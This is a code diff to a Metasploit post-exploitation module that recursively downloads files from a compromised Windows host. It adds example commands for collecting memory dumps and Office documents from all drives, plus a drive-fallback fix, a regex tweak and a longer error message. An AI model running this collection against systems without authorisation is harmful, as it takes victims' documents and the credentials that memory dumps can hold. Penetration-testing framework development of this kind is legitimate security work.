@@ -15,12 +15,15 @@ class MetasploitModule < Msf::Post
       'Name'          => 'Windows Gather Generic File Collection',
       'Description'   => %q{
         This module downloads files recursively based on the FILE_GLOBS option.
+        run post/windows/gather/enum_files FILE_GLOBS=*.dmp SEARCH_FROM=*
+        run post/windows/gather/enum_files FILE_GLOBS=*.docx;*.docx;*.xls;*.xlsx SEARCH_FROM=*
       },
       'License'       => MSF_LICENSE,
       'Author'        =>
         [
           '3vi1john <Jbabio[at]me.com>',
-          'RageLtMan <rageltman[at]sempervictus>'
+          'RageLtMan <rageltman[at]sempervictus>',
+          'MTX.hktalent <hktalent[at]qq.com>>'
         ],
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ]
@@ -107,6 +110,10 @@ class MetasploitModule < Msf::Post
     my_drive = $1
 
     location = datastore['SEARCH_FROM']
+    # fix drive is not available:run post/windows/gather/enum_files FILE_GLOBS=*.dmp SEARCH_FROM=C:/
+    if not my_drive
+      my_drive = drives[0]
+    end
     if '*' == location or '' == location
       drives.each do |i|
         location = i + ":/"
@@ -114,13 +121,13 @@ class MetasploitModule < Msf::Post
       end
       return
     end
-    if location and location !~ /^([a-z])\:[\\|\/].*/i
+    if location and location !~ /^([a-zA-Z])\:[\\|\/].*/i
       print_error("Invalid SEARCH_FROM option: #{location}")
       return
     end
 
     if location and not drives.include?(my_drive)
-      print_error("#{my_drive} drive is not available, please try: #{drives.inspect}")
+      print_error("location:#{location}  [my_drive:#{my_drive}] drive is not available, please try: #{drives.inspect}")
       return
     end
     
